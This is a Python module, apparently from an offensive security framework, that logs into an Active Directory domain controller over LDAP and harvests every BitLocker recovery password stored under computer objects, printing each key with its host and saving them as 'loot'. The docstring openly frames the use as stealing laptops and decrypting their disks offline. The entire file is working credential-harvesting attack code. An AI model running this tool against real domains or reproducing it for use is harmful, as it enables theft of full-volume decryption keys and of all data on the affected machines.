"""BitLocker recovery keys in AD (Maelstrom's bitlocker).

When BitLocker is deployed with AD backup (the default in most orgs),
every volume's recovery password is written to an msFVE-RecoveryInformation
object under the owning computer — readable by Domain Admins and by
whatever delegation mistakes the org made. A recovery password is a
full-volume decrypt key: steal the laptop, ignore the TPM, boot the
disk offline, own everything on it.

The keys sit under computer objects (CN=<guid+timestamp>,CN=<HOST>,...),
so the parent DN tells you which machine each password unlocks.
Findings are collated into the store (loot).
"""

from core.module import AuxiliaryModule
from core.options import OptAddress, OptString

try:
    from impacket.ldap import ldap as impacket_ldap
    from impacket.ldap import ldapasn1
except ImportError:
    impacket_ldap = None  # console gates run() on requirements

SEARCH_FILTER = "(objectClass=msFVE-RecoveryInformation)"
SEARCH_ATTRS = ["msFVE-RecoveryPassword", "msFVE-RecoveryGuid"]


def domain_to_base(domain):
    """forge.local -> DC=forge,DC=local"""
    return ",".join(f"DC={part}" for part in domain.split("."))


def parent_cn(dn):
    """CN=<keyid>,CN=WS01,CN=Computers,... -> WS01 (the owning host)."""
    parts = dn.split(",")
    for part in parts[1:]:
        if part.upper().startswith("CN="):
            return part[3:]
    return "?"


class BitlockerKeys(AuxiliaryModule):
    name = "BitLocker Recovery Keys in AD (LDAP)"
    description = """
        Harvests BitLocker recovery passwords from AD
        (msFVE-RecoveryInformation objects under each computer). A
        recovery password is a full-volume decrypt key. Needs rights to
        read those objects (Domain Admin by default). Collated into the
        store (loot).
    """
    authors = ["you"]
    requirements = ["impacket"]

    def register_options(self):
        self.options.add(OptAddress("RHOSTS", required=True,
                                    description="Domain controller(s), comma-separated"))
        self.options.add(OptString("DOMAIN", required=True,
                                   description="Domain, e.g. forge.local"))
        self.options.add(OptString("USERNAME", required=True,
                                   description="Domain user with FVE read rights"))
        self.options.add(OptString("PASSWORD", required=True, description="Password"))

    def run(self):
        base = domain_to_base(str(self.get_option("DOMAIN")))
        user = str(self.get_option("USERNAME") or "")
        password = str(self.get_option("PASSWORD") or "")
        for host in [h.strip() for h in str(self.get_option("RHOSTS")).split(",")
                     if h.strip()]:
            self._enum(host, base, user, password)

    def _enum(self, host, base, user, password):
        domain = str(self.get_option("DOMAIN"))
        try:
            # impacket's LDAPConnection doesn't parse ports from URLs —
            # AD LDAP is 389 by definition, so the lab binds it 1:1.
            conn = impacket_ldap.LDAPConnection(f"ldap://{host}")
            conn.login(user, password, domain)
        except Exception as e:
            self.print_error(f"{host}: LDAP bind as {user} failed - {e}")
            return
        self.print_status(f"{host}: bound to {domain} as {user}")

        store = getattr(self.framework, "store", None)
        count = 0
        loot_lines = []
        for packet in conn.search(searchBase=base, searchFilter=SEARCH_FILTER,
                                  attributes=SEARCH_ATTRS):
            if not isinstance(packet, ldapasn1.SearchResultEntry):
                continue  # referrals / searchResDone
            count += 1
            dn = str(packet["objectName"])
            owner = parent_cn(dn)
            attrs = {}
            for attr in packet["attributes"]:
                attrs[str(attr["type"])] = [str(v) for v in attr["vals"]]
            recovery = attrs.get("msFVE-RecoveryPassword", ["?"])[0]
            self.print_good(f"{owner}: {recovery}")
            loot_lines.append(f"{owner}\t{recovery}\t{dn}")
        if count == 0:
            self.print_status(f"{host}: no BitLocker recovery keys "
                              "(or none readable)")
        if store is not None and loot_lines:
            store.add_loot("bitlocker-keys", f"recovery keys @ {host}",
                           "\n".join(loot_lines), address=host)
